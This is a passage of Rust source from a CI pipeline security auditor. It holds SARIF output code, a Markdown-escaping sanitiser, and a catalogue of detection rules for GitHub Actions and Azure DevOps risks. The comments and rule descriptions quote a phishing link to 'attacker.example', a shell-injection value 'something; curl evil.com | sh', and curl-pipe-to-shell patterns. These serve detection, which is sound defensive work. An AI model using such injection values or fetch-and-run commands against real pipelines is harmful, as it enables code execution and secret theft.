use std::borrow::Cow;

use serde::Serialize;
use taudit_core::custom_rules::CustomRule;
use taudit_core::error::TauditError;
use taudit_core::finding::{
    compute_finding_group_id, compute_fingerprint, compute_suppression_key, rule_id_for, Finding,
    FindingSource, FixEffort, Severity,
};
use taudit_core::graph::AuthorityGraph;
use taudit_core::ports::ReportSink;

const SARIF_SCHEMA: &str = "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json";
const SARIF_VERSION: &str = "2.1.0";
const TOOL_NAME: &str = "taudit";
const TOOL_URI: &str = "https://github.com/0ryant/taudit";
const RULES_BASE_URI: &str = "https://github.com/0ryant/taudit/blob/main/docs/rules";

// ── Render-boundary sanitisation ────────────────────────

/// Escape Markdown / HTML special characters in `s` so attacker-controlled
/// content cannot inject clickable links, images, code-block escapes, or
/// HTML tags into SARIF `result.message.text`.
///
/// **Why this matters:** GitHub Code Scanning (and several other SARIF
/// consumers) renders Markdown links inside the `text` field. Without this
/// escape, a `finding.message` of
/// `"Click [here](https://attacker.example/?steal=1) for context"`
/// produces a clickable phishing link embedded in what appears to a triage
/// reviewer as an authentic taudit alert. tsign attests "this YAML produced
/// these bytes" — it does NOT attest "these bytes are safe to render in a
/// Markdown viewer". Closing that gap is the responsibility of the render
/// boundary.
///
/// Escaped characters (the EXPLOITABLE Markdown / HTML set — narrow on
/// purpose to avoid noising up legitimate identifiers like `AWS_KEY`,
/// `GITHUB_TOKEN`, kebab-case rule ids, and version strings like `v1.2-beta`):
///   * `\` `[` `]` `(` `)` — link / image / footnote anchors (PHISHING vector)
///   * `<` `>` — HTML tag delimiters (TAG INJECTION vector)
///   * `` ` `` — inline code spans (CODE-FENCE BREAKOUT vector)
///   * `*` — emphasis & unordered-list marker (paired with `[]()` to bold
///     phishing links; high-density in attacker payloads)
///   * `!` — image marker (becomes `![...](...)` clickable image when paired
///     with the bracket/paren forms above)
///
/// NOT escaped (cosmetic-only, false-positive on legitimate identifiers):
/// `_`, `~`, `{`, `}`, `#`, `+`, `-`, `|`. These can produce italic/strike/
/// heading rendering quirks but cannot mint a clickable link or HTML tag.
/// If a future SARIF consumer renders any of those into a payload-carrying
/// element, extend `is_markdown_special` and add a regression test.
///
/// Performance: O(n), single-pass. Returns `Cow::Borrowed` (zero-alloc) when
/// the input contains no Markdown special chars; `Cow::Owned` otherwise.
///
/// Hand-rolled, no new dependencies.
///
/// ⚠️  Apply ONLY to attacker-controllable strings. Built-in `RULE_DEFS`
/// short/full descriptions are author-controlled (see `RULE_DEFS` in this
/// crate) — their Markdown formatting is intentional and MUST NOT be
/// escaped. Custom-rule names, finding messages, and any string sourced
/// from pipeline YAML or custom-rule YAML MUST be escaped.
pub(crate) fn escape_markdown(s: &str) -> Cow<'_, str> {
    if !needs_markdown_escape(s) {
        return Cow::Borrowed(s);
    }
    // Worst case: every byte gets one backslash prefix → 2× growth.
    let mut out = String::with_capacity(s.len() + s.len() / 4);
    for c in s.chars() {
        if is_markdown_special(c) {
            out.push('\\');
        }
        out.push(c);
    }
    Cow::Owned(out)
}

#[inline]
fn is_markdown_special(c: char) -> bool {
    matches!(
        c,
        '\\' | '[' | ']' | '(' | ')' | '<' | '>' | '*' | '`' | '!'
    )
}

#[inline]
fn needs_markdown_escape(s: &str) -> bool {
    s.chars().any(is_markdown_special)
}

// ── Static rule catalogue ───────────────────────────────

pub struct RuleDef {
    pub id: &'static str,
    pub name: &'static str,
    pub short_description: &'static str,
    pub full_description: &'static str,
    pub default_level: &'static str,
    pub security_severity: &'static str,
    pub tags: &'static [&'static str],
}

/// Public accessor for the static rule catalogue. Used by `taudit explain`
/// and any other consumer that needs to enumerate the built-in rules.
pub fn all_rules() -> &'static [RuleDef] {
    RULE_DEFS
}

pub const RULE_DEFS: &[RuleDef] = &[
    RuleDef {
        id: "authority_propagation",
        name: "AuthorityPropagation",
        short_description: "A secret or identity propagates to a step in a lower trust zone.",
        full_description:
            "A secret or identity propagates to a step in a lower trust zone, allowing \
             privileged credentials to be observed or exfiltrated by untrusted code.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "over_privileged_identity",
        name: "OverPrivilegedIdentity",
        short_description:
            "A GITHUB_TOKEN or service identity has broader permissions than needed.",
        full_description:
            "A GITHUB_TOKEN or service identity has broader permissions than needed for the \
             work the workflow actually performs, expanding the blast radius if the token is \
             misused or leaked.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "unpinned_action",
        name: "UnpinnedAction",
        short_description:
            "A third-party action is referenced by mutable tag instead of SHA digest.",
        full_description:
            "A third-party action is referenced by a mutable tag or branch instead of an \
             immutable SHA digest. The action's code can change under the workflow without \
             any local change, enabling supply-chain attacks.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "oidc_identity_in_untrusted_context",
        name: "OidcIdentityInUntrustedContext",
        short_description: "An untrusted trigger context can mint an OIDC identity.",
        full_description:
            "A pull request, merge request, workflow_run, issue/comment, or equivalent \
             untrusted trigger context can reach an OIDC-capable identity. OIDC avoids \
             long-lived secrets but still needs provider-side subject and audience \
             constraints, protected refs, or environment gates.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "oidc", "privilege-escalation"],
    },
    RuleDef {
        id: "action_major_version_pin_without_sha",
        name: "ActionMajorVersionPinWithoutSha",
        short_description: "An action is pinned only to a mutable major-version tag.",
        full_description:
            "A GitHub Actions `uses:` reference is pinned only to a moving major tag such \
             as `@v1` or `@v2`. Major tags can be retargeted by the action maintainer; pin \
             the action to a full commit SHA for reproducible supply-chain evidence.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "known_compromised_action_ref",
        name: "KnownCompromisedActionRef",
        short_description: "An action reference matches a public compromise advisory family.",
        full_description:
            "A workflow references a GitHub Action family with a public compromise advisory. \
             Static YAML cannot prove a historical run executed an affected SHA; correlate \
             the workflow run timestamp and resolved action ref with the advisory window, \
             then rotate any secrets reachable by the job.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "supply-chain", "github-actions", "advisory"],
    },
    RuleDef {
        id: "untrusted_with_authority",
        name: "UntrustedWithAuthority",
        short_description:
            "An untrusted or unpinned step has direct access to a secret or identity.",
        full_description:
            "An untrusted or unpinned step has direct access to a secret or identity. \
             Compromise of that step yields immediate compromise of the associated authority. \
             \n\n\
             On ADO, System.AccessToken is injected into every task by the platform — this \
             is structural exposure, not a misconfiguration. Findings against System.AccessToken \
             are emitted at Info severity to distinguish them from actionable Critical findings \
             against explicit secrets or service connections. To reduce structural exposure, \
             set `env.SYSTEM_ACCESSTOKEN` only on steps that require it, or restrict the \
             token scope via pipeline-level `security:` settings.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "artifact_boundary_crossing",
        name: "ArtifactBoundaryCrossing",
        short_description:
            "An artifact produced by a privileged step is consumed across a trust boundary.",
        full_description:
            "An artifact produced by a privileged step is consumed across a trust boundary \
             without attestation or verification, allowing downstream stages to execute \
             content originating from a higher-trust context without provenance checks.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "floating_image",
        name: "FloatingImage",
        short_description: "A container image is referenced without a digest pin.",
        full_description:
            "A container image is referenced by tag (e.g. :latest) rather than an immutable \
             digest. The image contents may change between runs without any local change, \
             breaking reproducibility and enabling supply-chain attacks.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "long_lived_credential",
        name: "LongLivedCredential",
        short_description:
            "A secret name matches static credential patterns (API keys, passwords, tokens).",
        full_description:
            "A secret referenced by the workflow matches patterns indicating a long-lived \
             static credential (API key, password, personal access token). Long-lived \
             credentials should be replaced with short-lived OIDC-issued tokens where possible.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials"],
    },
    RuleDef {
        id: "persisted_credential",
        name: "PersistedCredential",
        short_description: "Checkout step persists repository credentials to disk",
        full_description:
            "A checkout step with persistCredentials:true writes the repository token to \
             .git/config on disk, where it persists beyond the lifetime of the step and may \
             be read by subsequent steps or exfiltrated.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "trigger_context_mismatch",
        name: "TriggerContextMismatch",
        short_description: "Privileged workflow triggered by untrusted pull request context",
        full_description:
            "A workflow triggered by pull_request_target or an ADO pr trigger runs with \
             write permissions in the base repository context while potentially executing \
             untrusted code from a fork, creating a privilege escalation path.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "cross_workflow_authority_chain",
        name: "CrossWorkflowAuthorityChain",
        short_description: "Authority-bearing step delegates to external or untrusted workflow",
        full_description:
            "A step holding secrets or elevated identity permissions delegates execution to \
             a reusable workflow or template hosted in an external or untrusted repository, \
             allowing that external code to inherit the authority.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "authority_cycle",
        name: "AuthorityCycle",
        short_description: "Workflow delegation graph contains a cycle",
        full_description:
            "The workflow delegation graph contains a cycle — a workflow calls itself or \
             another workflow that eventually calls back, creating unbounded privilege \
             escalation paths and potential infinite execution.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "configuration"],
    },
    RuleDef {
        id: "uplift_without_attestation",
        name: "UpliftWithoutAttestation",
        short_description: "OIDC-privileged build does not produce a signed attestation",
        full_description:
            "A step with access to an OIDC identity produces artifacts without generating a \
             cryptographic attestation. Downstream consumers cannot verify provenance or \
             integrity of these artifacts.",
        default_level: "note",
        security_severity: "0.1",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "self_mutating_pipeline",
        name: "SelfMutatingPipeline",
        short_description:
            "Step writes to GITHUB_ENV or GITHUB_PATH, mutating the pipeline environment",
        full_description: "A step appends to GITHUB_ENV or GITHUB_PATH, injecting values into the \
             environment or PATH for all subsequent steps. An untrusted or compromised step \
             could use this to escalate privileges or hijack later execution.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "injection"],
    },
    RuleDef {
        id: "variable_group_in_pr_job",
        name: "VariableGroupInPrJob",
        short_description: "PR-triggered job accesses ADO variable group secrets",
        full_description: "A PR-triggered pipeline job has access to variable group secrets. PR \
             pipelines run in the context of untrusted contributor code — variable group \
             secrets crossing this boundary may be exfiltrated via log output, environment \
             variables, or network calls.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "self_hosted_pool_pr_hijack",
        name: "SelfHostedPoolPrHijack",
        short_description: "PR pipeline uses self-hosted pool with repository checkout",
        full_description: "A PR-triggered pipeline runs on a self-hosted agent and checks out the \
             repository. An attacker can inject malicious git hooks via the PR that persist \
             on the shared runner, executing with the pipeline's full authority on \
             subsequent runs.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "injection"],
    },
    RuleDef {
        id: "shared_self_hosted_pool_no_isolation",
        name: "SharedSelfHostedPoolNoIsolation",
        short_description: "ADO self-hosted pool missing workspace isolation (`workspace: {clean: all}`)",
        full_description: "An ADO pipeline runs on a self-hosted agent pool that does not declare \
             `workspace: { clean: all }`. Self-hosted agents are shared across pipeline runs — a previous \
             run (potentially from a low-trust source) can leave behind malicious files, compiled \
             artefacts, or git hooks that persist on disk and execute with the next run's authority, \
             including privileged deployment jobs. Microsoft-hosted agents are ephemeral and are never \
             flagged by this rule.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "azure-devops"],
    },
    RuleDef {
        id: "service_connection_scope_mismatch",
        name: "ServiceConnectionScopeMismatch",
        short_description: "Broad-scope service connection accessible from PR-triggered job",
        full_description:
            "A PR-triggered pipeline job has access to an ADO service connection with \
             broad or unknown scope and no OIDC federation. The static credential may have \
             subscription-wide Azure RBAC permissions, enabling lateral movement into the \
             Azure tenant from untrusted PR code.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "template_extends_unpinned_branch",
        name: "TemplateExtendsUnpinnedBranch",
        short_description:
            "ADO pipeline pulls a template repository pinned to a mutable branch or default branch.",
        full_description:
            "An Azure DevOps pipeline declares a `resources.repositories` entry that resolves to a \
             mutable target — either no `ref:` field at all (defaults to the repo's default branch) \
             or `refs/heads/<branch>` with a normal branch name. The pipeline references the alias \
             via `extends:`, `template: x@<alias>`, or `checkout: <alias>`. Whoever owns that branch \
             can inject steps into every consuming pipeline at the next run — the ADO equivalent of \
             an unpinned GitHub Action. Combined with self-hosted pool reuse this is full pipeline \
             RCE. Pin to `refs/tags/<x>` or a 40-char commit SHA.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "template_repo_ref_is_feature_branch",
        name: "TemplateRepoRefIsFeatureBranch",
        short_description:
            "ADO pipeline pins a template repository to a developer feature branch.",
        full_description:
            "An Azure DevOps pipeline's `resources.repositories[].ref` resolves to a feature-class \
             branch — anything outside the platform-blessed set (`main`, `master`, `release/*`, \
             `hotfix/*`). Feature branches typically have weaker push protection than the trunk: any \
             developer with write access to that branch can push pipeline YAML that runs with the \
             consumer pipeline's authority — service connections, variable groups, OIDC federations, \
             `System.AccessToken`. This is strictly worse than pinning to `main`, because main \
             usually has branch protection (required reviewers, build validation) that a feature \
             branch lacks. Co-fires with `template_extends_unpinned_branch`, which describes the \
             same entry from the abstract \"not pinned\" angle. Pin to `refs/tags/<x>` or a 40-char \
             commit SHA.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "azure-devops"],
    },
    RuleDef {
        id: "vm_remote_exec_via_pipeline_secret",
        name: "VmRemoteExecViaPipelineSecret",
        short_description:
            "Pipeline step uses Azure VM remote-exec primitive with secret or SAS in the command line",
        full_description:
            "A pipeline step invokes Set-AzVMExtension/CustomScriptExtension, \
             Invoke-AzVMRunCommand, az vm run-command, or az vm extension set, \
             where the executed command line is constructed from a pipeline secret or \
             a freshly-minted SAS token. This is a pipeline-to-VM lateral movement \
             primitive — every pipeline run can RCE every VM in scope, and the \
             credential embedded in the command line is logged in plaintext on the VM \
             (CustomScriptExtension status JSON, Windows event log, /var/log) and in \
             the ARM extension status that anyone with reader on the resource can pull.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "lateral-movement"],
    },
    RuleDef {
        id: "short_lived_sas_in_command_line",
        name: "ShortLivedSasInCommandLine",
        short_description:
            "SAS token minted in-pipeline is passed as a command-line argument",
        full_description:
            "A SAS token minted in-pipeline (New-AzStorage*SASToken or \
             az storage * generate-sas) is interpolated into commandToExecute, \
             scriptArguments, --arguments, -ArgumentList, or otherwise placed on \
             the process command line instead of being passed via env var or stdin. \
             Even short-lived SAS tokens in argv hit Linux /proc/*/cmdline, Windows \
             ETW process-create events, and ARM extension status — logged for the \
             SAS lifetime, accessible to any local process with the right privileges \
             and any reader on the resource.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "credentials"],
    },
    RuleDef {
        id: "checkout_self_pr_exposure",
        name: "CheckoutSelfPrExposure",
        short_description: "PR-triggered pipeline checks out attacker-controlled repository code",
        full_description:
            "A PR-triggered pipeline job (pull_request_target or ADO pr: trigger) performs \
             a checkout of the repository. Attacker-controlled code from a forked PR lands on \
             the runner's workspace and is readable by all subsequent steps. Any step that \
             reads workspace files — scripts, configs, test fixtures — is a potential \
             exfiltration or injection vector. This is distinct from trigger_context_mismatch \
             which fires on authority access; this rule fires whenever code from an untrusted \
             source lands on a privileged runner, regardless of explicit secret access.",
        default_level: "warning",
        security_severity: "7.0",
        tags: &["security", "supply-chain", "pull-request"],
    },
    RuleDef {
        id: "secret_to_inline_script_env_export",
        name: "SecretToInlineScriptEnvExport",
        short_description: "Pipeline secret assigned to a shell variable inside an inline script",
        full_description: "An inline script (`script:`, `Bash@3.inputs.script`, \
             `PowerShell@2.inputs.script`, `AzureCLI@2.inputs.inlineScript`, …) assigns a \
             pipeline `$(SECRET)` value to a shell variable (`export FOO=$(SECRET)`, \
             `$X = \"$(SECRET)\"`). ADO masks `$(SECRET)` as it appears in log output, but \
             masking is applied to the rendered command string before the shell runs. Once \
             the value is bound to a shell variable any transcript (`Start-Transcript`, \
             `bash -x`, `terraform TF_LOG=DEBUG`, `az --debug`, error stack traces) prints \
             the cleartext credential — a historical breach vector for ADO-hosted Terraform \
             and Azure CLI pipelines.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "secret_materialised_to_workspace_file",
        name: "SecretMaterialisedToWorkspaceFile",
        short_description: "Pipeline secret written to a file under the agent workspace",
        full_description: "An inline script writes a pipeline `$(SECRET)` value to a file under \
             `$(System.DefaultWorkingDirectory)`, `$(Build.SourcesDirectory)`, or with a \
             credential-bearing extension (`.tfvars`, `.env`, `.hcl`, `.pfx`, `.key`, `.pem`, \
             `.kubeconfig`, …). The file persists for the rest of the job, is readable by \
             every subsequent step, and may be uploaded by a later `PublishPipelineArtifact` \
             task. Use the `secureFile` task or stream the secret over stdin / an env var \
             to the consuming tool instead.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "keyvault_secret_to_plaintext",
        name: "KeyVaultSecretToPlaintext",
        short_description: "Inline PowerShell pulls a Key Vault secret as plaintext (-AsPlainText)",
        full_description:
            "An inline PowerShell or AzurePowerShell step calls `Get-AzKeyVaultSecret \
             -AsPlainText`, `ConvertFrom-SecureString -AsPlainText`, or the older \
             `(Get-AzKeyVaultSecret …).SecretValueText` pattern, landing the secret in a \
             non-`SecureString` variable. The value is fetched directly from Key Vault — it \
             never traverses the ADO variable-group boundary, so pipeline log masking does \
             not apply. Verbose `Az` / PowerShell logging (`Set-PSDebug -Trace`, \
             `$VerbosePreference = \"Continue\"`) and any error stack trace will then print \
             the cleartext credential. Keep the secret as a `SecureString` and only convert \
             to plaintext at the exact moment of consumption.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "terraform_auto_approve_in_prod",
        name: "TerraformAutoApproveInProd",
        short_description:
            "`terraform apply -auto-approve` against a production service connection without an environment gate",
        full_description:
            "An ADO step runs `terraform apply -auto-approve` (either via an inline script \
             or via TerraformCLI/TerraformTask with `command: apply` and commandOptions \
             containing `auto-approve`) against a service connection whose name matches \
             production patterns (`prod`, `production`, `prd`), and the enclosing job has \
             no `environment:` binding. The auto-approve flag bypasses the only ADO-side \
             change-control on infrastructure rewrites; combined with a shared agent pool, \
             any committer can rewrite production.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "configuration", "azure-devops"],
    },
    RuleDef {
        id: "add_spn_with_inline_script",
        name: "AddSpnWithInlineScript",
        short_description:
            "`AzureCLI` task with addSpnToEnvironment:true plus an inline script — federated token can be laundered",
        full_description:
            "An `AzureCLI@2` (or `AzurePowerShell`) task runs an inline script with \
             `addSpnToEnvironment: true`, which exposes the federated SPN material \
             (`$env:idToken`, `$env:servicePrincipalKey`, `$env:servicePrincipalId`, \
             `$env:tenantId`) as environment variables. An inline script can write that \
             material to a normal pipeline variable via `##vso[task.setvariable]`, after \
             which the OIDC token is inherited un-masked by every downstream task.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "secrets_inherit_overscoped_passthrough",
        name: "SecretsInheritOverscopedPassthrough",
        short_description:
            "Reusable workflow called with `secrets: inherit` under an attacker-influenced trigger",
        full_description:
            "A reusable workflow `uses:` call uses `secrets: inherit` while the calling \
             workflow is triggered by `pull_request`, `pull_request_target`, \
             `pull_request_review`, `pull_request_review_comment`, `issue_comment`, or \
             `workflow_run`. `inherit` forwards the entire caller secret bag to the callee \
             regardless of which secrets the callee consumes — every transitive `uses:` in \
             the called workflow inherits the same scope. Combined with a trigger an external \
             party can fire (PR open, issue comment, workflow_run reaction), every secret in \
             scope is one compromised callee away from exfiltration. Replace with an explicit \
             `secrets:` mapping that lists only the secrets the callee actually needs.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "propagation", "github-actions"],
    },
    RuleDef {
        id: "unsafe_pr_artifact_in_workflow_run_consumer",
        name: "UnsafePrArtifactInWorkflowRunConsumer",
        short_description:
            "workflow_run/pull_request_target consumer downloads and interprets a PR-context artifact",
        full_description:
            "A workflow triggered by `workflow_run` or `pull_request_target` downloads an \
             artifact from the originating run AND interprets its content into a privileged \
             sink — posting the bytes back to a PR comment, piping them into `$GITHUB_ENV`/\
             `$GITHUB_OUTPUT`, `eval`, `unzip`/`tar -x`, or `cat`/`jq`. The producer ran in PR \
             context, so a malicious PR can write arbitrary content into the artifact while \
             the consumer runs with upstream-repo authority (typically `pull-requests: write` \
             plus contents/issues scope). The classic mypy_primer / coverage-comment artifact \
             RCE pattern. Treat downloaded artifacts as untrusted, validate against a strict \
             schema, and never feed unsanitised content into a sink that mutates the \
             environment, comments, or env vars.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "parameter_interpolation_into_shell",
        name: "ParameterInterpolationIntoShell",
        short_description:
            "Free-form string parameter interpolated into an inline script — shell injection vector",
        full_description:
            "A pipeline-level `parameters:` entry of `type: string` with no `values:` \
             allowlist is interpolated via `${{ parameters.<name> }}` directly into an \
             inline shell or PowerShell script body. ADO does not escape parameter values \
             during YAML emission, so anyone with permission to queue the build can inject \
             arbitrary shell commands by passing a malicious value (e.g. \
             `something; curl evil.com | sh`). Constrain inputs with a `values:` allowlist \
             or pass the parameter through the step's `env:` block so the runtime quotes it.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "injection", "azure-devops"],
    },
    RuleDef {
        id: "runtime_script_fetched_from_floating_url",
        name: "RuntimeScriptFetchedFromFloatingUrl",
        short_description:
            "A `run:` step downloads and executes a script from a mutable URL (curl|bash from a branch ref).",
        full_description:
            "A workflow step pipes a remotely-fetched script directly into a shell \
             interpreter (`curl … | bash`, `wget … | sh`, `bash <(curl …)`, \
             `deno run https://…`) where the URL is not pinned to a tag or commit SHA — \
             typically containing `refs/heads/`, `/main/`, or `/master/`. Whoever can land \
             a commit on the referenced branch (including the upstream maintainers, but \
             also any attacker who compromises the upstream account) executes arbitrary \
             code on the runner with the workflow's full token scope. Pin to a release tag \
             or, better, to a commit SHA, and verify the download against a checksum.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "docker_socket_exposed_to_ci_step",
        name: "DockerSocketExposedToCiStep",
        short_description: "A CI step exposes the host Docker socket.",
        full_description:
            "A CI step references or mounts `/var/run/docker.sock`. Docker socket access is \
             effectively runner-host authority because the step can start containers with \
             arbitrary bind mounts and read host filesystem state. Prefer rootless builders \
             or a dedicated isolated runner with no shared workspace and no secrets.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "isolation", "containers"],
    },
    RuleDef {
        id: "privileged_container_in_ci_step",
        name: "PrivilegedContainerInCiStep",
        short_description: "A CI step starts a privileged container.",
        full_description:
            "A CI step runs Docker, Podman, or Buildah with `--privileged`. Privileged \
             containers remove normal kernel isolation and can become runner-host compromise \
             primitives when combined with bind mounts, cached workspaces, or secrets.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "isolation", "containers"],
    },
    RuleDef {
        id: "pr_trigger_with_floating_action_ref",
        name: "PrTriggerWithFloatingActionRef",
        short_description:
            "High-authority PR trigger combined with a non-SHA-pinned action ref — single-PR RCE chain.",
        full_description:
            "The workflow uses a high-authority PR-class trigger (`pull_request_target`, \
             `issue_comment`, or `workflow_run`) that runs in the base repository context \
             with full `GITHUB_TOKEN` write permissions, and at least one step references \
             an action by a mutable ref (`@main`, `@master`, `@v1`) instead of a 40-char \
             commit SHA. Anyone who can push to the referenced action branch executes code \
             with full write access on the target repository — a one-PR exploit chain. \
             Either drop the privileged trigger (use `pull_request` for CI) or pin every \
             action in the workflow to a commit SHA.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "untrusted_api_response_to_env_sink",
        name: "UntrustedApiResponseToEnvSink",
        short_description:
            "API response derived from PR metadata is written to $GITHUB_ENV — environment injection vector.",
        full_description:
            "A `workflow_run`-triggered workflow captures output from a GitHub API call \
             (`gh pr view`, `gh api`, `curl api.github.com`) and pipes it into \
             `$GITHUB_ENV`, `$GITHUB_OUTPUT`, or `$GITHUB_PATH` without sanitisation. \
             Because the API response embeds attacker-influenced fields (branch name, PR \
             title, head commit message), a value crafted to contain a newline plus \
             `KEY=value` injects an environment variable into every subsequent step in \
             the same job — including steps that hold the repository write token. \
             Validate with a strict regex before redirecting to the env file, or write \
             only known-numeric fields (PR number, commit timestamp).",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "pr_build_pushes_image_with_floating_credentials",
        name: "PrBuildPushesImageWithFloatingCredentials",
        short_description:
            "PR-triggered workflow logs into a container registry via a non-SHA-pinned action.",
        full_description:
            "A `pull_request`-triggered workflow uses a container-registry login action \
             (`docker/login-action`, `aws-actions/amazon-ecr-login`, `azure/docker-login`, \
             `google-github-actions/auth`) pinned to a mutable ref. The login action \
             receives either an OIDC token (when `id-token: write` is granted) or a \
             long-lived registry credential. A compromise of the action's branch lets an \
             attacker exfiltrate that credential, and any subsequent `docker push` \
             publishes a PR-controlled image to a shared registry — poisoning every \
             downstream consumer. Pin every login action to a commit SHA and gate the \
             push step on `if: github.event.pull_request.head.repo.fork == false`.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "credentials", "github-actions"],
    },
    RuleDef {
        id: "secret_via_env_gate_to_untrusted_consumer",
        name: "SecretViaEnvGateToUntrustedConsumer",
        short_description:
            "Secret laundered through $GITHUB_ENV by a first-party step is read by a later untrusted step in the same job.",
        full_description:
            "A first-party step writes a Secret/Identity-derived value into `$GITHUB_ENV` \
             (or pipeline-variable equivalent), and a later step in the same job that \
             runs in the Untrusted or ThirdParty trust zone reads from the runner-managed \
             env via `${{ env.X }}`. The two component rules — `self_mutating_pipeline` \
             on the writer and `untrusted_with_authority` on the consumer — each see only \
             half the chain and emit no finding; the env gate launders the secret across \
             the trust boundary without ever producing a `HasAccessTo` edge from the \
             consumer to the original credential. \
             \n\n\
             Mitigation: pass the secret to the consuming step via an explicit `env:` \
             mapping on that step (so the relationship is graph-visible) instead of \
             writing it to `$GITHUB_ENV` for ambient pickup. If the consumer is a \
             third-party action, pin it to a 40-char SHA before exposing any \
             secret-derived value to it.",
        default_level: "error",
        security_severity: "9.0",
        tags: &[
            "security",
            "privilege-escalation",
            "propagation",
            "github-actions",
        ],
    },
    // ── Blue-team positive invariants ───────────────────────
    RuleDef {
        id: "no_workflow_level_permissions_block",
        name: "NoWorkflowLevelPermissionsBlock",
        short_description:
            "GitHub Actions workflow declares no top-level or per-job `permissions:` block.",
        full_description:
            "The workflow declares neither a top-level `permissions:` block nor a per-job \
             `permissions:` block. Without an explicit declaration, `GITHUB_TOKEN` falls back to \
             the broad GitHub default scope (`contents: write`, `packages: write`, metadata \
             read, etc.) on every trigger. The blast radius cannot be determined by reading the \
             workflow file alone — making both review and incident triage harder. Add \
             `permissions: {}` at the top level (strips all defaults), then narrow per-job to \
             the minimum each job needs.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "configuration", "github-actions"],
    },
    RuleDef {
        id: "prod_deploy_job_no_environment_gate",
        name: "ProdDeployJobNoEnvironmentGate",
        short_description:
            "ADO production deployment job has no `environment:` binding (no approval gate).",
        full_description:
            "An ADO step targets a service connection whose name matches a production pattern \
             (`prod`, `production`, `prd`) but the enclosing job carries no `environment:` \
             binding. Strictly broader than `terraform_auto_approve_in_prod` — fires on any \
             prod-SC operation (Terraform apply, ARM/Bicep deployment, AzureCLI/AzurePowerShell \
             custom step) regardless of whether `-auto-approve` is present. Without an \
             environment binding the step bypasses the only ADO-side approval gate, runs on \
             every trigger, and produces no entry in the ADO Environments audit trail.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation", "azure-devops"],
    },
    RuleDef {
        id: "long_lived_secret_without_oidc_recommendation",
        name: "LongLivedSecretWithoutOidcRecommendation",
        short_description:
            "Long-lived cloud credential in scope; provider supports OIDC and no OIDC identity exists.",
        full_description:
            "A long-lived static credential is in scope (name matches an AWS / GCP / Azure \
             pattern such as `AWS_*`, `GCP_*`, `GOOGLE_*`, `AZURE_*`, `ARM_*`) AND no OIDC \
             identity is present in the workflow's authority graph. The named cloud supports \
             OIDC federation, so the static credential could be replaced with a short-lived \
             token issued at runtime. Advisory uplift on top of `long_lived_credential` — does \
             not double-flag the underlying credential, only adds the migration recommendation. \
             Wires the existing `Recommendation::FederateIdentity` enum variant.",
        default_level: "note",
        security_severity: "0.1",
        tags: &["security", "credentials"],
    },
    RuleDef {
        id: "pull_request_workflow_inconsistent_fork_check",
        name: "PullRequestWorkflowInconsistentForkCheck",
        short_description:
            "Some privileged jobs in this PR workflow guard with a fork-check `if:`; others do not.",
        full_description:
            "A `pull_request` / `pull_request_target` workflow has multiple privileged jobs \
             (jobs with steps that hold secrets or identity authority). At least one job's \
             privileged steps are guarded by the standard fork-check `if:` \
             (`github.event.pull_request.head.repo.fork == false` or the equivalent \
             `head.repo.full_name == github.repository`) — but at least one OTHER privileged \
             job is unguarded. The org has the right defensive instinct (some jobs have the \
